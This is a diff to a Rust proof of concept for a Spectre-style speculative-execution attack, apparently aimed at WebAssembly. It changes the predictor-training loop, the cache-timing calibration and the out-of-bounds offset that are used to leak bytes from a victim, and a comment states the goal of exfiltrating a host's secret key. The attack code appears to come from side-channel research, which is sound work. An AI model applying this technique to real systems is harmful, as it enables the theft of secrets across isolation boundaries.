@@ -18,6 +18,7 @@ extern "C" {
     fn _mm_clflush(ptr: *const u8);
     fn _mm_mfence();
     fn _mm_lfence();
+    fn finish();
 
     // Pseudo victim code
     fn victim_code(index: u32);
@@ -26,10 +27,9 @@ extern "C" {
     // fn sync_in_sibling()
 }
 
-const data_size: usize = 11;
+const data_size: usize = 16;
 const PAD: usize = 160;
 // We need to add the pad here
-static mut public_data: [u8; PAD] = [2; PAD];
 
 const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
 // If wasm target, move this from here, as well as the victim code
@@ -87,8 +87,9 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         // binary. The idea is to exfiltrate the data used by the host as it is a secret key for example.
         // Here we access the line to measure the threshold of the cache hit
         #[cfg(all(target_arch = "wasm32"))]
-        for j in 0..500 {
-            let location = if (j + 1) % 30 != 0 {
+        for j in 0..100 {
+            
+            let location = if (j + 1) % 10 != 0 {
                 safe_index as usize
             } else {
                 malicious_x as usize
@@ -98,24 +99,25 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             unsafe {
                 victim_code(location as u32);
             }
-            
+
         }
-        #[cfg(feature = "tracing")]
-        println!("Measuring time now");
+        // #[cfg(feature = "tracing")]
+        // println!("Measuring time now");
         for j in 0..256 {
             // To avoid stride caching
             let mix_i = ((j * 167) + 13) & 255;
 
             let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
-            #[cfg(feature = "tracing")]
-            println!("Mem {:?}", addr);
+            //#[cfg(feature = "tracing")]
+            //println!("Mem {:?}", addr);
             // Read the mem addr
             let end = unsafe {
                 let start = _rdtsc();
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            if end <= (90 * hit + 10 * miss) / 100 {
+            // There are two values to see, the real access and the fake access
+            if end <= (90 * hit + 10 * miss) / 100{
                 scores[mix_i] += 1;
             }
         }
@@ -129,7 +131,6 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
                 max2 = j as i32;
             }
         }
-
         // patch from https://github.com/ikemmm/rust-spectre/blob/55a034a5272ff8644b09c3ad203fc6df7e80c5fd/src/main.rs#L260
         // Swap max1 and max2 if the max1 is 0x00
         if max1 as u8 == 0x00 {
@@ -163,14 +164,14 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
 #[no_mangle]
 pub fn predict(pad: usize) {
 
-    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 1000000);
+    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 10000000);
     println!("Hit {} Miss {}", hit, miss);
 
     for j in 0..11 {
         // let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 1000000);
         // #[cfg(feature = "tracing")]
         
-        let (score, value) = read_memory_byte(j + pad, hit, miss);
+        let (score, value) = read_memory_byte(j + data_size, hit, miss);
         // get value 0 as char
         let ch = value[0] as u8 as char;
         let ch2 = value[1] as u8 as char;
@@ -183,32 +184,20 @@ pub fn predict(pad: usize) {
         );
 
         #[cfg(not(feature = "tracing"))]
-        print!("{}", ch);
+        print!("{}({:x})", ch, ch as u8);
         std::io::stdout().flush().unwrap();
     }
 }
 
 pub fn main() {
     // Filling up public data
-    unsafe {
-        public_data[0] = 1;
-        public_data[1] = 2;
-        public_data[2] = 3;
-        public_data[3] = 4;
-        public_data[4] = 5;
-        public_data[5] = 6;
-        public_data[6] = 7;
-        public_data[7] = 8;
-        public_data[8] = 9;
-        public_data[9] = 10;
-        public_data[10] = 11;
-        public_data[11] = 12;
-        public_data[12] = 13;
-        public_data[13] = 14;
-        public_data[14] = 15;
-        public_data[15] = 16;
-    }
+    
+    
 
     eprintln!("Starting attack");
     predict(0);
+
+    unsafe {
+        finish();
+    }
 }
